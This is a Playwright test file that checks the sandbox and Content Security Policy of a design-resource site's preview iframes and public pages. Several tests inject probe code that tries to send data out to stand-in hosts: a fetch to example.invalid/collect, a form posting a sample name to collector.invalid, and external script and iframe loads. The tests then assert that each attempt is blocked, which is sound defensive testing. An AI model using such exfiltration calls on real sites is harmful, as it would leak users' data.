import { expect, test } from '@playwright/test';
import { createHash } from 'node:crypto';

const isolatedPreview = (page: import('@playwright/test').Page) =>
  page.frameLocator('iframe[title="Isolated Tessellate resource preview"]');

test('a preview opened directly remains opaque and cannot access Site storage', async ({
  page,
}) => {
  const consoleErrors: string[] = [];
  const uncaughtErrors: string[] = [];
  const failedRequests: string[] = [];
  page.on('console', (message) => {
    if (message.type() === 'error') consoleErrors.push(message.text());
  });
  page.on('pageerror', (error) => uncaughtErrors.push(error.message));
  page.on('requestfailed', (request) => failedRequests.push(request.url()));

  const response = await page.goto('/preview/?resource=button');
  expect(response?.status()).toBe(200);
  await expect(isolatedPreview(page).locator('.tess-screen')).toBeVisible();
  const screenshotPath = test.info().project.name.includes('mobile')
    ? 'quality/evidence/step-37/preview-direct-after-390.png'
    : 'quality/evidence/step-37/preview-direct-after-1440.png';
  await page.screenshot({ path: screenshotPath, fullPage: true });
  expect(response?.headers()['content-security-policy']).toContain('sandbox allow-scripts');

  const isolation = await page.evaluate(() => {
    let localStorageBlocked = false;
    try {
      window.localStorage.setItem('tessellate-preview-security-probe', '1');
      window.localStorage.removeItem('tessellate-preview-security-probe');
    } catch {
      localStorageBlocked = true;
    }
    return { origin: window.origin, localStorageBlocked };
  });

  expect(isolation).toEqual({ origin: 'null', localStorageBlocked: true });
  expect(consoleErrors).toEqual([]);
  expect(uncaughtErrors).toEqual([]);
  expect(failedRequests).toEqual([]);
});

test('a directly opened preview cannot create a scripted external popup', async ({ page }) => {
  const externalRequests: string[] = [];
  const uncaughtErrors: string[] = [];
  page.on('pageerror', (error) => uncaughtErrors.push(error.message));
  await page.route('https://example.invalid/**', async (route) => {
    externalRequests.push(route.request().url());
    await route.abort();
  });

  const response = await page.goto('/preview/?resource=button');
  expect(response?.status()).toBe(200);
  expect(response?.headers()['content-security-policy']).toContain('sandbox allow-scripts');
  await expect(isolatedPreview(page).locator('.tess-screen')).toBeVisible();

  await isolatedPreview(page).locator('body').evaluate(() => {
    const button = document.createElement('button');
    button.textContent = 'Popup boundary probe';
    button.addEventListener('click', () => {
      window.open('https://example.invalid/popup-probe', '_blank', 'noopener');
    });
    document.body.append(button);
  });
  const popupEvent = page.waitForEvent('popup', { timeout: 500 }).catch(() => null);
  await isolatedPreview(page).getByRole('button', { name: 'Popup boundary probe' }).click();
  const popup = await popupEvent;

  expect(popup).toBeNull();
  expect(externalRequests).toEqual([]);
  expect(uncaughtErrors).toEqual([]);
  const screenshotPath = test.info().project.name.includes('mobile')
    ? 'quality/evidence/step-37/preview-popup-after-390.png'
    : 'quality/evidence/step-37/preview-popup-after-1440.png';
  await page.screenshot({ path: screenshotPath, fullPage: true });
});

test('a directly opened preview cannot activate an external anchor by script', async ({ page }) => {
  const externalRequests: string[] = [];
  const uncaughtErrors: string[] = [];
  page.on('pageerror', (error) => uncaughtErrors.push(error.message));
  await page.route('https://example.invalid/**', async (route) => {
    externalRequests.push(route.request().url());
    await route.abort();
  });

  const response = await page.goto('/preview/?resource=button');
  expect(response?.status()).toBe(200);
  expect(response?.headers()['content-security-policy']).toContain('sandbox allow-scripts');
  await expect(isolatedPreview(page).locator('.tess-screen')).toBeVisible();
  const originalUrl = page.url();
  const beforePath = test.info().project.name.includes('mobile')
    ? 'quality/evidence/step-37/preview-anchor-navigation-before-390.png'
    : 'quality/evidence/step-37/preview-anchor-navigation-before-1440.png';
  await page.screenshot({ path: beforePath, fullPage: true });

  await isolatedPreview(page).locator('body').evaluate(() => {
    const anchor = document.createElement('a');
    anchor.href = 'https://example.invalid/anchor-probe';
    anchor.target = '_self';
    document.body.append(anchor);

    const button = document.createElement('button');
    button.textContent = 'Anchor boundary probe';
    button.addEventListener('click', () => anchor.click());
    document.body.append(button);
  });
  await isolatedPreview(page).getByRole('button', { name: 'Anchor boundary probe' }).click();
  await page.waitForTimeout(150);

  expect(page.url()).toBe(originalUrl);
  expect(externalRequests).toEqual([]);
  expect(uncaughtErrors).toEqual([]);
  const screenshotPath = test.info().project.name.includes('mobile')
    ? 'quality/evidence/step-37/preview-anchor-navigation-after-390.png'
    : 'quality/evidence/step-37/preview-anchor-navigation-after-1440.png';
  await page.screenshot({ path: screenshotPath, fullPage: true });
});

test('a preview can trigger only one parent initialization response', async ({ page }) => {
  const consoleErrors: string[] = [];
  const uncaughtErrors: string[] = [];
  const failedRequests: string[] = [];
  const httpErrors: string[] = [];
  page.on('console', (message) => {
    if (message.type() === 'error') consoleErrors.push(message.text());
  });
  page.on('pageerror', (error) => uncaughtErrors.push(error.message));
  page.on('requestfailed', (request) => failedRequests.push(request.url()));
  page.on('response', (response) => {
    if (response.status() >= 400) httpErrors.push(`${response.status()} ${response.url()}`);
  });

  await page.addInitScript(() => {
    Reflect.set(window, '__previewInitializationReplies', 0);
    window.addEventListener('message', (event) => {
      const data = (event as MessageEvent<unknown>).data;
      if (
        typeof data === 'object' &&
        data !== null &&
        'type' in data &&
        data.type === 'TESSELLATE_PREVIEW_INIT'
      ) {
        const current = Reflect.get(window, '__previewInitializationReplies');
        Reflect.set(window, '__previewInitializationReplies', Number(current) + 1);
      }
    });
  });

  const response = await page.goto('/r/button');
  expect(response?.status()).toBe(200);

  const preview = page.locator('iframe[title="Button live preview"]');
  await expect(preview).toHaveAttribute('sandbox', 'allow-scripts');
  const frame = page.frameLocator('iframe[title="Button live preview"]');
  await expect(frame.locator('.tess-screen')).toBeVisible();
  const screenshotPath = test.info().project.name.includes('mobile')
    ? 'quality/evidence/step-37/preview-ready-replay-after-390.png'
    : 'quality/evidence/step-37/preview-ready-replay-after-1440.png';
  await page.screenshot({ path: screenshotPath, fullPage: true });

  const initializationReplies = await frame.locator('body').evaluate(async () => {
    window.parent.postMessage(
      {
        type: 'TESSELLATE_PREVIEW_READY',
        resourceId: 'different-resource',
        width: 1,
        height: 1,
      },
      '*'
    );
    for (let index = 0; index < 8; index += 1) {
      window.parent.postMessage(
        {
          type: 'TESSELLATE_PREVIEW_READY',
          resourceId: 'button',
          width: 1,
          height: 1,
        },
        '*'
      );
    }

    await new Promise((resolve) => window.setTimeout(resolve, 50));
    return Reflect.get(window, '__previewInitializationReplies');
  });

  expect(initializationReplies).toBe(1);
  expect(consoleErrors).toEqual([]);
  expect(uncaughtErrors).toEqual([]);
  expect(failedRequests).toEqual([]);
  expect(httpErrors).toEqual([]);

  const previewButton = frame.getByRole('button', { name: 'Click me', exact: true });
  const initialButtonClass = await previewButton.getAttribute('class');
  const variantBeforePath = test.info().project.name.includes('mobile')
    ? 'quality/evidence/step-37/preview-host-variant-before-390.png'
    : 'quality/evidence/step-37/preview-host-variant-before-1440.png';
  await page.screenshot({ path: variantBeforePath, fullPage: true });
  await page.getByRole('button', { name: 'Expressive', exact: true }).click();
  await expect(preview).toHaveAttribute('src', /variant=expressive/);
  await expect
    .poll(() => previewButton.getAttribute('class'))
    .not.toBe(initialButtonClass);
  const variantAfterPath = test.info().project.name.includes('mobile')
    ? 'quality/evidence/step-37/preview-host-variant-after-390.png'
    : 'quality/evidence/step-37/preview-host-variant-after-1440.png';
  await page.screenshot({ path: variantAfterPath, fullPage: true });
  await expect(frame.locator('.tess-screen')).toBeVisible();
  await expect
    .poll(() => frame.locator('body').evaluate(() => Reflect.get(window, '__previewInitializationReplies')))
    .toBe(1);
});

test('preview CSP blocks forms from sending entered data to an external origin', async ({
  page,
  request,
}) => {
  const externalSubmissions: Array<{ url: string; method: string; body: string | null }> = [];
  await page.route('https://collector.invalid/**', (route) => route.abort());
  page.on('request', (request) => {
    if (request.url().startsWith('https://collector.invalid/')) {
      externalSubmissions.push({
        url: request.url(),
        method: request.method(),
        body: request.postData(),
      });
    }
  });

  const response = await page.goto('/preview/?resource=button');
  expect(response?.status()).toBe(200);
  await page.evaluate(() => {
    const form = document.createElement('form');
    form.method = 'post';
    form.action = 'https://collector.invalid/collect';
    const field = document.createElement('input');
    field.name = 'employeeName';
    field.value = 'Alice Example';
    form.append(field);
    document.body.append(form);
    form.requestSubmit();
  });
  await page.waitForTimeout(150);

  expect(externalSubmissions).toEqual([]);
  expect(response?.headers()['content-security-policy']).toContain("form-action 'none'");
  const siteShell = await request.get('/explore');
  expect(siteShell.status()).toBe(200);
  expect(siteShell.headers()['content-security-policy']).toContain("form-action 'self'");
});

test('Explore previews load under an opaque sandbox with only compiled asset connections', async ({
  page,
}) => {
  const consoleErrors: string[] = [];
  const failedCompiledAssets: string[] = [];
  const previewPolicies: string[] = [];

  page.on('console', (message) => {
    if (message.type() === 'error') consoleErrors.push(message.text());
  });
  page.on('pageerror', (error) => consoleErrors.push(error.message));
  page.on('requestfailed', (request) => {
    if (request.url().includes('/_astro/'))
      failedCompiledAssets.push(`${request.url()} (${request.failure()?.errorText ?? 'failed'})`);
  });
  page.on('response', (response) => {
    if (response.url().includes('/preview-content/?resource=accordion')) {
      previewPolicies.push(response.headers()['content-security-policy'] ?? '');
    }
  });

  const response = await page.goto('/explore');
  expect(response?.status()).toBe(200);
  await expect(page.getByText('Showing 50 of 324 resources', { exact: true })).toBeVisible();
  const frame = page.locator('iframe[title="Accordion actual preview"]');
  await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
  await frame.scrollIntoViewIfNeeded();
  await expect(
    page
      .frameLocator('iframe[title="Accordion actual preview"]')
      .getByText('What is this example?', { exact: true })
  ).toBeVisible();
  const isolation = await page
    .frameLocator('iframe[title="Accordion actual preview"]')
    .locator('body')
    .evaluate(() => {
      let parentDocumentBlocked = false;
      let parentStorageBlocked = false;
      try {
        void window.parent.document.body;
      } catch {
        parentDocumentBlocked = true;
      }
      try {
        void window.parent.localStorage.length;
      } catch {
        parentStorageBlocked = true;
      }
      return { origin: window.origin, parentDocumentBlocked, parentStorageBlocked };
    });
  expect(isolation).toEqual({
    origin: 'null',
    parentDocumentBlocked: true,
    parentStorageBlocked: true,
  });

  const origin = new URL(page.url()).origin;
  const policy = previewPolicies.find((value) => value.includes("default-src 'none'")) ?? '';
  expect(policy).toContain(`connect-src ${origin}/_astro/`);
  expect(policy).toContain("frame-src 'none'");
  expect(policy).not.toContain('api.tessellate.design');
  expect(consoleErrors).toEqual([]);
  expect(failedCompiledAssets).toEqual([]);
});

test('sandboxed Explore previews preserve resource inline style behavior', async ({ page }) => {
  const consoleErrors: string[] = [];
  page.on('console', (message) => {
    if (message.type() === 'error') consoleErrors.push(message.text());
  });
  page.on('pageerror', (error) => consoleErrors.push(error.message));

  await page.goto('/explore');
  await expect(page.getByText('Showing 50 of 324 resources', { exact: true })).toBeVisible();
  await page.getByLabel('Search catalogue').fill('progress bar');
  await expect(page.getByRole('link', { name: 'Progress Bar', exact: true })).toBeVisible();
  const frame = page
    .frameLocator('iframe[title="Progress Bar actual preview"]');
  await expect(frame.locator('.tess-screen')).toBeVisible();
  const widths = await frame.locator('.h-2').evaluate((parent) => {
    const fill = parent.querySelector(':scope > div');
    return {
      parent: Number.parseFloat(getComputedStyle(parent).width),
      fill: fill ? Number.parseFloat(getComputedStyle(fill).width) : 0,
    };
  });
  expect(widths.fill / widths.parent).toBeCloseTo(0.65, 1);
  expect(consoleErrors).toEqual([]);
});

test('an untrusted preview cannot send data to an external origin', async ({ page }) => {
  const blockedByPolicy: string[] = [];
  const unexpectedErrors: string[] = [];
  const externalRequests: string[] = [];
  const externalResponses: string[] = [];
  const externalFailures: string[] = [];
  page.on('console', (message) => {
    if (message.type() !== 'error') return;
    if (/content security policy|violates the following/i.test(message.text())) {
      blockedByPolicy.push(message.text());
    } else {
      unexpectedErrors.push(message.text());
    }
  });
  page.on('pageerror', (error) => unexpectedErrors.push(error.message));
  page.on('request', (request) => {
    if (request.url().startsWith('https://example.invalid/')) externalRequests.push(request.url());
  });
  page.on('response', (response) => {
    if (response.url().startsWith('https://example.invalid/'))
      externalResponses.push(response.url());
  });
  page.on('requestfailed', (request) => {
    if (request.url().startsWith('https://example.invalid/')) {
      externalFailures.push(`${request.url()}: ${request.failure()?.errorText ?? 'failed'}`);
    }
  });

  const response = await page.goto('/explore');
  expect(response?.status()).toBe(200);
  await page.locator('iframe[title="Accordion actual preview"]').scrollIntoViewIfNeeded();
  const frame = page
    .frameLocator('iframe[title="Accordion actual preview"]');
  await expect(frame.getByText('What is this example?', { exact: true })).toBeVisible();
  const bootstrapStyleApplied = await frame
    .locator('astro-island')
    .evaluate((island) => getComputedStyle(island).display);
  expect(bootstrapStyleApplied).toBe('contents');
  const networkAttempts = await frame.locator('body').evaluate(async () => {
    let fetchRejected = false;
    let workletModuleRejected = false;
    let nestedSrcdocExecuted = false;
    window.addEventListener('message', (event) => {
      if (event.data === 'tessellate-srcdoc-ran') nestedSrcdocExecuted = true;
    });
    try {
      await fetch('https://example.invalid/collect', { mode: 'no-cors' });
    } catch {
      fetchRejected = true;
    }

    const audioContext = new AudioContext();
    try {
      await audioContext.audioWorklet.addModule('https://example.invalid/worklet.js');
    } catch {
      workletModuleRejected = true;
    } finally {
      await audioContext.close();
    }

    const image = document.createElement('img');
    image.src = 'https://example.invalid/pixel';
    document.body.append(image);

    const nestedFrame = document.createElement('iframe');
    nestedFrame.src = 'https://example.invalid/embed';
    document.body.append(nestedFrame);

    const srcdocFrame = document.createElement('iframe');
    srcdocFrame.setAttribute('sandbox', 'allow-scripts');
    srcdocFrame.srcdoc = `<script>parent.postMessage('tessellate-srcdoc-ran', '*')</script>`;
    document.body.append(srcdocFrame);

    const externalScript = document.createElement('script');
    externalScript.src = 'https://example.invalid/script.js';
    document.head.append(externalScript);

    const injectedInlineScript = document.createElement('script');
    injectedInlineScript.textContent =
      'document.documentElement.dataset.tessellateInjectedPreviewScript = "true"';
    document.head.append(injectedInlineScript);

    await new Promise((resolve) => setTimeout(resolve, 150));
    return {
      fetchRejected,
      workletModuleRejected,
      nestedSrcdocExecuted,
      injectedInlineScriptRan:
        document.documentElement.dataset.tessellateInjectedPreviewScript === 'true',
    };
  });

  expect(networkAttempts.fetchRejected).toBe(true);
  expect(networkAttempts.workletModuleRejected).toBe(true);
  expect(networkAttempts.nestedSrcdocExecuted).toBe(false);
  expect(networkAttempts.injectedInlineScriptRan).toBe(false);
  expect(
    externalResponses,
    JSON.stringify({ externalRequests, externalFailures, blockedByPolicy })
  ).toEqual([]);
  expect(externalFailures).toHaveLength(externalRequests.length);
  expect(
    externalFailures.every((failure) =>
      /\bcsp\b|ERR_BLOCKED_BY_CSP|BLOCKED_BY_CLIENT|ERR_ABORTED/i.test(failure)
    ),
    JSON.stringify({ externalRequests, externalFailures, blockedByPolicy })
  ).toBe(true);
  expect(blockedByPolicy.some((message) => /connect-src/i.test(message))).toBe(true);
  expect(blockedByPolicy.some((message) => /img-src/i.test(message))).toBe(true);
  expect(blockedByPolicy.some((message) => /frame-src/i.test(message))).toBe(true);
  expect(blockedByPolicy.some((message) => /script-src/i.test(message))).toBe(true);
  expect(unexpectedErrors).toEqual([]);
});

test('preview CSP limits scripts and styles to compiled assets or build-certified hashes', async ({
  request,
  page,
}) => {
  const response = await request.get(
    '/preview-content/?resource=button&variant=quiet&theme=light&device=desktop&reducedMotion=false'
  );
  expect(response.status()).toBe(200);
  const origin = new URL(response.url()).origin;
  const policy = response.headers()['content-security-policy'] ?? '';
  const html = await response.text();
  const directives = new Map(
    policy.split(';').map((directive) => {
      const [name, ...sources] = directive.trim().split(/\s+/);
      return [name, sources];
    })
  );
  const contentHash = (content: string) =>
    `'sha256-${createHash('sha256').update(content).digest('base64')}'`;
  const inlineScripts = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)]
    .filter(([, attributes]) => !/\bsrc\s*=/i.test(attributes ?? ''))
    .map(([, , content]) => content ?? '');
  const inlineStyles = [...html.matchAll(/<style\b[^>]*>([\s\S]*?)<\/style>/gi)].map(
    ([, content]) => content ?? ''
  );

  expect(directives.get('script-src')).toContain(`${origin}/_astro/`);
  expect(directives.get('script-src')).not.toContain("'unsafe-inline'");
  expect(inlineScripts.length).toBeGreaterThan(0);
  for (const script of inlineScripts)
    expect(directives.get('script-src')).toContain(contentHash(script));
  expect(directives.get('style-src')).toContain(`${origin}/_astro/`);
  expect(directives.get('style-src')).not.toContain("'unsafe-inline'");
  expect(directives.get('style-src-attr')).toEqual(["'unsafe-inline'"]);
  expect(directives.get('style-src-elem')).toContain(`${origin}/_astro/`);
  expect(directives.get('style-src-elem')).not.toContain("'unsafe-inline'");
  expect(inlineStyles.length).toBeGreaterThan(0);
  expect(directives.get('style-src')).toContain(contentHash('body {}'));
  expect(directives.get('style-src-elem')).toContain(contentHash('body {}'));
  for (const style of inlineStyles) {
    expect(directives.get('style-src')).toContain(contentHash(style));
    expect(directives.get('style-src-elem')).toContain(contentHash(style));
  }

  const cspErrors: string[] = [];
  const runtimeErrors: string[] = [];
  const failedRequests: string[] = [];
  page.on('console', (message) => {
    if (message.type() === 'error') {
      runtimeErrors.push(message.text());
      if (/content security policy/i.test(message.text())) cspErrors.push(message.text());
    }
  });
  page.on('pageerror', (error) => runtimeErrors.push(`pageerror: ${error.message}`));
  page.on('requestfailed', (request) =>
    failedRequests.push(
      `${request.method()} ${request.url()}: ${request.failure()?.errorText ?? 'failed'}`
    )
  );
  const preview = await page.goto('/preview/?resource=onboarding-role-select');
  expect(preview?.status()).toBe(200);
  const directFrame = isolatedPreview(page);
  try {
    await expect(directFrame.getByRole('heading', { name: 'How will you use Tessellate?' })).toBeVisible();
  } catch (error) {
    await test.info().attach('preview-runtime-diagnostics', {
      body: JSON.stringify(
        { runtimeErrors, failedRequests, body: await directFrame.locator('body').innerText() },
        null,
        2
      ),
      contentType: 'application/json',
    });
    throw error;
  }
  const renderedStyleBlocks = await directFrame
    .locator('style')
    .evaluateAll((styles) => styles.map((style) => style.textContent ?? ''));
  for (const style of renderedStyleBlocks) {
    if (style.trim()) expect(directives.get('style-src-elem')).toContain(contentHash(style));
  }
  const animatedPreview = await page.goto('/preview/?resource=animated-gradient-line');
  expect(animatedPreview?.status()).toBe(200);
  await expect(isolatedPreview(page).getByRole('heading', { name: 'Luminescent Divider Beam' })).toBeVisible();
  const resourceStyle = await isolatedPreview(page)
    .locator('style')
    .evaluateAll(
      (styles) =>
        styles
          .map((style) => style.textContent ?? '')
          .find((style) => style.includes('@keyframes moveBeam')) ?? null
    );
  expect(resourceStyle).not.toBeNull();
  expect(directives.get('style-src')).toContain(contentHash(resourceStyle ?? ''));
  expect(directives.get('style-src-elem')).toContain(contentHash(resourceStyle ?? ''));
  expect(cspErrors).toEqual([]);
  expect(runtimeErrors).toEqual([]);
  expect(failedRequests).toEqual([]);
});

test('public shell blocks a newly injected inline script', async ({ page }) => {
  const policyBlocks: string[] = [];
  const runtimeErrors: string[] = [];
  page.on('console', (message) => {
    if (message.type() !== 'error') return;
    if (/content security policy|violates the following/i.test(message.text())) {
      policyBlocks.push(message.text());
    } else {
      runtimeErrors.push(message.text());
    }
  });
  page.on('pageerror', (error) => runtimeErrors.push(`pageerror: ${error.message}`));

  await page.goto('/');
  await page.evaluate(() => {
    const script = document.createElement('script');
    script.textContent = 'window.__tessellateInjectedScriptRan = true';
    document.head.append(script);
  });
  expect(
    await page.evaluate(() => Reflect.get(window, '__tessellateInjectedScriptRan') ?? false)
  ).toBe(false);
  expect(policyBlocks.some((message) => /script-src/i.test(message))).toBe(true);
  expect(runtimeErrors).toEqual([]);
});

test('public shell CSP authorizes only build-certified inline code', async ({ request, page }) => {
  const routes = [
    '/',
    '/explore',
    '/compose',
    '/workbench',
    '/r/button',
    '/showcase/showcase-ai-developer-platform',
  ];
  const contentHash = (content: string) =>
    `'sha256-${createHash('sha256').update(content).digest('base64')}'`;
  const runtimeErrors: string[] = [];
  const failedRequests: string[] = [];
  page.on('console', (message) => {
    if (message.type() === 'error') runtimeErrors.push(message.text());
  });
  page.on('pageerror', (error) => runtimeErrors.push(`pageerror: ${error.message}`));
  page.on('requestfailed', (request) =>
    failedRequests.push(
      `${request.method()} ${request.url()}: ${request.failure()?.errorText ?? 'failed'}`
    )
  );

  for (const route of routes) {
    const response = await request.get(route);
    expect(response.status(), route).toBe(200);
    const html = await response.text();
    const policy = response.headers()['content-security-policy'] ?? '';
    const directives = new Map(
      policy.split(';').map((directive) => {
        const [name, ...sources] = directive.trim().split(/\s+/);
        return [name, sources];
      })
    );
    const inlineScripts = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)]
      .filter(([, attributes]) => !/\bsrc\s*=/i.test(attributes ?? ''))
      .map(([, , content]) => content ?? '');
    const inlineStyles = [...html.matchAll(/<style\b[^>]*>([\s\S]*?)<\/style>/gi)].map(
      ([, content]) => content ?? ''
    );

    expect(directives.get('script-src'), route).toContain("'self'");
    expect(directives.get('script-src'), route).not.toContain("'unsafe-inline'");
    expect(inlineScripts.length, route).toBeGreaterThan(0);
    for (const script of inlineScripts) {
      expect(directives.get('script-src'), `${route} inline script hash`).toContain(
        contentHash(script)
      );
    }
    expect(directives.get('style-src'), route).not.toContain("'unsafe-inline'");
    expect(directives.get('style-src-elem'), route).not.toContain("'unsafe-inline'");
    expect(directives.get('style-src-attr'), route).toEqual(["'unsafe-inline'"]);
    for (const style of inlineStyles) {
      expect(directives.get('style-src'), `${route} inline style hash`).toContain(
        contentHash(style)
      );
      expect(directives.get('style-src-elem'), `${route} inline style hash`).toContain(
        contentHash(style)
      );
    }

    const browserResponse = await page.goto(route);
    expect(browserResponse?.status(), route).toBe(200);
    if (route === '/compose') {
      await expect(page.getByTestId('catalog-status')).toContainText('Catalogue ready');
    }
    if (route === '/workbench') {
      await expect(page.getByTestId('top-toolbar')).toBeVisible();
      if (!test.info().project.name.includes('mobile')) {
        await expect(page.getByTestId('right-inspector')).toBeVisible();
      }
    }
  }
  expect(runtimeErrors).toEqual([]);
  expect(failedRequests).toEqual([]);
});
